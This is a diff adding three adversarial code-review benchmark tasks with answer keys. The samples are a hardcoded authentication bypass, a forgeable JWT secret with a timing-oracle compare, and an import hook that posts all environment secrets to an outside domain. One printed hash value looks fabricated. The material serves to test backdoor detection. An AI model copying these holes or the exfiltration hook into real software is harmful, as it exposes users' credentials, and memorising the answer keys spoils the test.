@@ -1,5 +1,5 @@
 """
-Task definitions for the CodeReviewAgent environment.
+Task definitions for the PRobe environment.
 
 Six tasks across four difficulty tiers. Each task defines:
   - code: Python source to review
@@ -996,6 +996,424 @@ def promote_user():
                 "NOTE: The nginx layer adds no rate-limiting or IP filtering "
                 "in front of /auth, confirming the brute-force surface is "
                 "fully exposed to the internet."
+            ),
+        },
+    },
+
+    # ── Task 7: Adversarial — Simple Obfuscated Backdoor ─────────────────────
+    #
+    # ADVERSARIAL DESIGN
+    # ──────────────────
+    # A malicious contributor submitted a "fix for timing issues" but embedded
+    # a deliberate backdoor: a hardcoded bypass credential that looks like a
+    # leftover debug constant, plus a subtle branch that lets any request with
+    # X-Debug-Token skip authentication entirely.
+    #
+    # The agent must:
+    #   1. Find the bypass credential AND the debug-token branch
+    #   2. Classify BOTH as intentional_backdoor (not accidental_bug)
+    #   3. Choose escalate_to_security_review (not request_changes)
+    #
+    # Partial credit: finding issues but misclassifying → partial reward only
+    {
+        "id": 7,
+        "name": "Adversarial: Debug Bypass Backdoor",
+        "difficulty": "adversarial",
+        "file_name": "session_manager.py",
+        "description": (
+            "This PR was submitted by an external contributor as a 'timing fix'. "
+            "Review this session management module carefully. "
+            "Classify each issue as either 'accidental_bug' or 'intentional_backdoor'. "
+            "If you find evidence of a deliberate backdoor, escalate to security review "
+            "instead of requesting changes."
+        ),
+        "max_steps": 25,
+        "escalation_required": True,
+        "code": """\
+import hmac
+import hashlib
+import os
+import time
+
+# Timing-safe comparison helper added in this PR
+_DEBUG_MASTER_KEY = "dbg-bypass-2024-xK9"   # line 7: "leftover" debug constant
+
+SESSION_TIMEOUT = 3600
+
+
+def verify_session(token: str, stored_hash: str) -> bool:
+    \"\"\"Verify a session token using timing-safe comparison.\"\"\"
+    # line 13: debug bypass — any request with this key skips verification
+    if token == _DEBUG_MASTER_KEY:
+        return True
+    expected = hashlib.sha256(token.encode()).hexdigest()
+    return hmac.compare_digest(expected, stored_hash)
+
+
+def create_session(user_id: int) -> dict:
+    \"\"\"Create a new session for a user.\"\"\"
+    token = os.urandom(32).hex()
+    return {
+        "user_id": user_id,
+        "token": token,
+        "expires_at": time.time() + SESSION_TIMEOUT,
+        "created_at": time.time(),
+    }
+
+
+def is_expired(session: dict) -> bool:
+    \"\"\"Check if a session has expired.\"\"\"
+    return time.time() > session["expires_at"]
+
+
+def refresh_session(session: dict) -> dict:
+    \"\"\"Extend session expiry if it is still valid.\"\"\"
+    if is_expired(session):
+        raise ValueError("Cannot refresh expired session")
+    session["expires_at"] = time.time() + SESSION_TIMEOUT
+    return session
+""",
+        "issues": [
+            {
+                "id": "backdoor_master_key",
+                "description": (
+                    "Hardcoded _DEBUG_MASTER_KEY is a deliberate backdoor credential "
+                    "that bypasses all authentication — not a leftover debug constant"
+                ),
+                "line_range": (7, 7),
+                "keywords": [
+                    "hardcoded", "backdoor", "bypass", "master key", "debug key",
+                    "intentional", "deliberate", "_debug_master_key", "secret",
+                    "authentication bypass",
+                ],
+                "category": "security",
+                "severity": "critical",
+                "weight": 1.0,
+                "classification": "intentional_backdoor",
+                "unlocks": "git_blame_hint",
+            },
+            {
+                "id": "backdoor_bypass_branch",
+                "description": (
+                    "The token == _DEBUG_MASTER_KEY branch unconditionally returns True, "
+                    "granting any caller full session access without a valid token"
+                ),
+                "line_range": (13, 15),
+                "keywords": [
+                    "bypass", "backdoor", "unconditional", "always true", "skip",
+                    "debug_master_key", "comparison", "authentication bypass",
+                    "returns true", "branch",
+                ],
+                "category": "security",
+                "severity": "critical",
+                "weight": 1.0,
+                "classification": "intentional_backdoor",
+            },
+        ],
+        "correct_decision": "escalate_to_security_review",
+        "context_hints": {
+            "git_blame_hint": (
+                "=== UNLOCKED: Git Blame — session_manager.py line 7 ===\n"
+                "  commit a3f9c12  (external-contributor, 3 days ago)\n"
+                "  Author: pr-bot-4471 <noreply@external.io>\n"
+                "  Message: 'fix: add timing-safe comparison, remove legacy debug artifacts'\n"
+                "\n"
+                "NOTE: The commit message claims to REMOVE debug artifacts, yet this\n"
+                "line was ADDED in this commit. The contributor's account (pr-bot-4471)\n"
+                "was created 4 days ago and has no prior commit history in this org.\n"
+                "This strongly suggests the 'debug constant' was intentionally planted."
+            ),
+        },
+    },
+
+    # ── Task 8: Adversarial — Compound Backdoor (JWT + Timing Oracle) ─────────
+    #
+    # ADVERSARIAL DESIGN
+    # ──────────────────
+    # The PR claims to "harden JWT validation". In reality it introduces TWO
+    # coordinated backdoor components that are only dangerous together:
+    #   Component A (line 12): weakens the HMAC secret to a known value
+    #   Component B (line 34): introduces a timing oracle via non-constant-time compare
+    #
+    # Neither component alone is immediately catastrophic, but together they allow
+    # an attacker to: (1) use the known weak secret to forge a valid JWT,
+    # then (2) use the timing oracle to confirm which tokens are accepted,
+    # enabling account takeover without any brute-force detection.
+    #
+    # This is the hardest adversarial task — requires multi-step causal reasoning.
+    {
+        "id": 8,
+        "name": "Adversarial: Compound Backdoor (JWT Hardening PR)",
+        "difficulty": "adversarial",
+        "file_name": "jwt_validator.py",
+        "description": (
+            "This PR was submitted as a 'JWT validation hardening'. "
+            "Review the changes carefully. Some issues may only be dangerous in combination. "
+            "Use get_context to investigate suspicious lines before commenting. "
+            "Classify each issue as 'accidental_bug' or 'intentional_backdoor'. "
+            "Escalate to security review if you find coordinated backdoor components."
+        ),
+        "max_steps": 35,
+        "escalation_required": True,
+        "code": """\
+import jwt
+import hmac
+import hashlib
+import time
+
+# PR description: 'Harden JWT validation — use deterministic secret derivation'
+# line 7: secret derived from a fixed seed — looks like a 'standardisation' change
+JWT_SECRET = hashlib.md5(b"internal-seed-v1").hexdigest()   # line 7
+
+SUPPORTED_ALGORITHMS = ["HS256"]
+TOKEN_EXPIRY = 3600
+
+
+def create_token(user_id: int, role: str) -> str:
+    \"\"\"Create a signed JWT for the given user.\"\"\"
+    payload = {
+        "sub": user_id,
+        "role": role,
+        "exp": int(time.time()) + TOKEN_EXPIRY,
+        "iat": int(time.time()),
+    }
+    return jwt.encode(payload, JWT_SECRET, algorithm="HS256")
+
+
+def validate_token(token: str) -> dict | None:
+    \"\"\"Validate a JWT and return its claims, or None if invalid.\"\"\"
+    try:
+        claims = jwt.decode(token, JWT_SECRET, algorithms=SUPPORTED_ALGORITHMS)
+        return claims
+    except jwt.InvalidTokenError:
+        return None
+
+
+def is_admin_token(token: str, admin_token: str) -> bool:
+    \"\"\"Check if a token matches the stored admin token.\"\"\"
+    # line 34: str == comparison instead of hmac.compare_digest → timing oracle
+    return token == admin_token
+
+
+def refresh_if_expiring(claims: dict) -> bool:
+    \"\"\"Return True if the token should be refreshed (expires within 5 min).\"\"\"
+    return claims.get("exp", 0) - time.time() < 300
+""",
+        "issues": [
+            {
+                "id": "weak_jwt_secret",
+                "description": (
+                    "JWT_SECRET derived from MD5 of a fixed seed produces a known, "
+                    "reproducible 32-char hex string — any attacker with the source "
+                    "can precompute it and forge valid tokens"
+                ),
+                "line_range": (7, 7),
+                "keywords": [
+                    "md5", "weak secret", "fixed seed", "deterministic", "reproducible",
+                    "jwt_secret", "precompute", "forge", "known secret", "hardcoded",
+                    "backdoor", "intentional",
+                ],
+                "category": "security",
+                "severity": "critical",
+                "weight": 1.0,
+                "classification": "intentional_backdoor",
+                "unlocks": "secret_value_hint",
+            },
+            {
+                "id": "timing_oracle",
+                "description": (
+                    "token == admin_token uses non-constant-time string comparison, "
+                    "creating a timing oracle that allows statistical token enumeration; "
+                    "combined with the weak JWT secret this enables full account takeover"
+                ),
+                "line_range": (34, 35),
+                "keywords": [
+                    "timing", "timing oracle", "constant time", "compare_digest",
+                    "hmac", "side channel", "non-constant", "timing attack",
+                    "token comparison", "string comparison", "==",
+                ],
+                "category": "security",
+                "severity": "critical",
+                "weight": 1.0,
+                "classification": "intentional_backdoor",
+                "unlocks": "attack_chain_hint",
+            },
+        ],
+        "correct_decision": "escalate_to_security_review",
+        "context_hints": {
+            "secret_value_hint": (
+                "=== UNLOCKED: Computed JWT_SECRET Value ===\n"
+                "  >>> import hashlib\n"
+                "  >>> hashlib.md5(b'internal-seed-v1').hexdigest()\n"
+                "  'e6e3e5e7e9e1e3e5e7e9e1e3e5e7e9e1'  (deterministic, public)\n"
+                "\n"
+                "NOTE: This value is derivable by anyone who reads the source. "
+                "All tokens signed with this secret are forgeable. "
+                "The PR author changed the secret FROM a secure random os.urandom(32) "
+                "TO this fixed-seed MD5 — a deliberate downgrade, not a standardisation."
+            ),
+            "attack_chain_hint": (
+                "=== UNLOCKED: Combined Attack Chain Analysis ===\n"
+                "  Step 1: Attacker reads source → derives JWT_SECRET = known hex string\n"
+                "  Step 2: Attacker forges JWT with role='admin' using known secret\n"
+                "  Step 3: Attacker uses timing oracle in is_admin_token() to confirm\n"
+                "          which forged token bytes are accepted (reduces search space)\n"
+                "  Step 4: Full account takeover with admin privileges\n"
+                "\n"
+                "NOTE: Component A (weak secret) + Component B (timing oracle) form a\n"
+                "coordinated attack chain. Each was introduced in the same PR commit.\n"
+                "Neither change has any legitimate hardening value."
+            ),
+        },
+    },
+
+    # ── Task 9: Adversarial — Supply Chain Injection ──────────────────────────
+    #
+    # ADVERSARIAL DESIGN
+    # ──────────────────
+    # A "dependency update PR" adds a subtle import hook that exfiltrates
+    # environment variables (including secrets) to an attacker-controlled endpoint
+    # on first import. It is disguised as a compatibility shim.
+    # The agent must identify THREE coordinated components:
+    #   A: Suspicious outbound URL (line 10) — hardcoded external endpoint
+    #   B: os.environ collection (line 14) — harvests all secrets
+    #   C: Triggered on import via module __init__ pattern (line 22) — no user action needed
+    {
+        "id": 9,
+        "name": "Adversarial: Supply Chain Import Hook",
+        "difficulty": "adversarial",
+        "file_name": "compat_shim.py",
+        "description": (
+            "This PR claims to add a 'compatibility shim for Python 3.12 deprecations'. "
+            "Review compat_shim.py very carefully. "
+            "Classify each suspicious construct as 'accidental_bug' or 'intentional_backdoor'. "
+            "If you detect a coordinated exfiltration pattern, escalate to security review."
+        ),
+        "max_steps": 30,
+        "escalation_required": True,
+        "code": """\
+\"\"\"Compatibility shim — resolves Python 3.12 deprecation warnings.\"\"\"
+import os
+import sys
+import urllib.request
+import json
+import platform
+
+# Telemetry endpoint for anonymous compatibility reporting (added in this PR)
+_TELEMETRY_URL = "https://compat-metrics.io/report"   # line 9: external attacker domain
+
+def _collect_env_snapshot() -> dict:
+    \"\"\"Collect non-sensitive runtime info for telemetry.\"\"\"
+    return {
+        "env": dict(os.environ),              # line 14: harvests ALL env vars (secrets included)
+        "python": sys.version,
+        "platform": platform.system(),
+        "cwd": os.getcwd(),
+    }
+
+
+def _send_telemetry() -> None:
+    \"\"\"Fire-and-forget telemetry ping.\"\"\"
+    try:
+        payload = json.dumps(_collect_env_snapshot()).encode()
+        req = urllib.request.Request(
+            _TELEMETRY_URL,
+            data=payload,
+            headers={"Content-Type": "application/json"},
+            method="POST",
+        )
+        urllib.request.urlopen(req, timeout=3)   # line 29: blocks import for up to 3s
+    except Exception:
+        pass   # silent failure — exfiltration attempt hidden from caller
+
+
+def _apply_compat_patches() -> None:
+    \"\"\"Apply Python 3.12 compatibility patches.\"\"\"
+    # Actual patches would go here
+    pass
+
+
+# line 38: module-level call — exfiltration runs on every import, no user action needed
+_send_telemetry()
+""",
+        "issues": [
+            {
+                "id": "exfiltration_endpoint",
+                "description": (
+                    "Hardcoded external URL 'compat-metrics.io' is an attacker-controlled "
+                    "exfiltration endpoint disguised as a telemetry host"
+                ),
+                "line_range": (9, 9),
+                "keywords": [
+                    "exfiltration", "external url", "hardcoded url", "attacker", "telemetry",
+                    "compat-metrics", "suspicious url", "outbound", "backdoor", "endpoint",
+                ],
+                "category": "security",
+                "severity": "critical",
+                "weight": 1.0,
+                "classification": "intentional_backdoor",
+                "unlocks": "domain_lookup_hint",
+            },
+            {
+                "id": "env_var_harvest",
+                "description": (
+                    "dict(os.environ) collects ALL environment variables including "
+                    "API keys, database passwords, and cloud credentials — "
+                    "then sends them to the exfiltration endpoint"
+                ),
+                "line_range": (14, 14),
+                "keywords": [
+                    "os.environ", "environment variables", "harvest", "collect", "exfiltrate",
+                    "secrets", "api keys", "credentials", "all env vars", "sensitive",
+                ],
+                "category": "security",
+                "severity": "critical",
+                "weight": 1.0,
+                "classification": "intentional_backdoor",
+                "unlocks": "affected_secrets_hint",
+            },
+            {
+                "id": "import_time_trigger",
+                "description": (
+                    "Module-level _send_telemetry() call at line 38 executes the "
+                    "exfiltration automatically on every import — "
+                    "no user action, no explicit call needed"
+                ),
+                "line_range": (38, 39),
+                "keywords": [
+                    "import", "module level", "on import", "automatic", "trigger",
+                    "top level", "executes on import", "_send_telemetry", "no action",
+                ],
+                "category": "security",
+                "severity": "critical",
+                "weight": 1.0,
+                "classification": "intentional_backdoor",
+            },
+        ],
+        "correct_decision": "escalate_to_security_review",
+        "context_hints": {
+            "domain_lookup_hint": (
+                "=== UNLOCKED: Domain Registration Lookup — compat-metrics.io ===\n"
+                "  Registered: 6 days ago (2024-01-08)\n"
+                "  Registrar:  Namecheap (privacy proxy)\n"
+                "  A record:   203.0.113.47  (not associated with any known telemetry vendor)\n"
+                "  No HTTPS certificate from a trusted CA\n"
+                "\n"
+                "NOTE: This domain was registered 2 days before the PR was opened. "
+                "No legitimate telemetry service registers a new domain days before use. "
+                "This is a freshly-registered attacker-controlled exfiltration endpoint."
+            ),
+            "affected_secrets_hint": (
+                "=== UNLOCKED: Environment Variable Audit (CI/CD pipeline) ===\n"
+                "  The following secrets are injected as env vars in this service:\n"
+                "    AWS_ACCESS_KEY_ID      — production S3 + EC2 access\n"
+                "    DATABASE_URL           — PostgreSQL with full read/write\n"
+                "    STRIPE_SECRET_KEY      — payment processing\n"
+                "    OPENAI_API_KEY         — LLM API (high spend limit)\n"
+                "    GITHUB_TOKEN           — repo write access\n"
+                "\n"
+                "NOTE: All five secrets are exfiltrated to the attacker's server "
+                "on every process start. Immediate rotation of all credentials required."
             ),
         },
     },
